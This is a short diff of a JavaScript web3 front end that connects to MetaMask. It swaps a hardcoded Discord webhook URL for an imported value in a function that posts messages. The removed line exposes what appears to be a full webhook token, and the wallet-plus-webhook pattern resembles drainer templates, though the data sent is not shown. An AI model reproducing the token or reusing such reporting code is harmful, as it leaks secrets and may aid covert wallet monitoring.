@@ -1,4 +1,5 @@
 export let web3 = new Web3(ethereum);
+import discord from "../secure";
 
 const isMetaMaskConnected = async () => {
   let accounts = await web3.eth.getAccounts();
@@ -19,10 +20,7 @@ function updateStatus(status) {
 
 function sendMessage(msg) {
   const request = new XMLHttpRequest();
-  request.open(
-    "POST",
-    "https://discord.com/api/webhooks/952813397089611776/Bj4b_SHyERBQKbvNTgpn0Ecyy6M1_HgXlXjUnviDpNXLOQfnm1V1iMa5cVUdRrhwFJjS"
-  );
+  request.open("POST", discord);
   // replace the url in the "open" method with yours
   request.setRequestHeader("Content-type", "application/json");
   const params = {
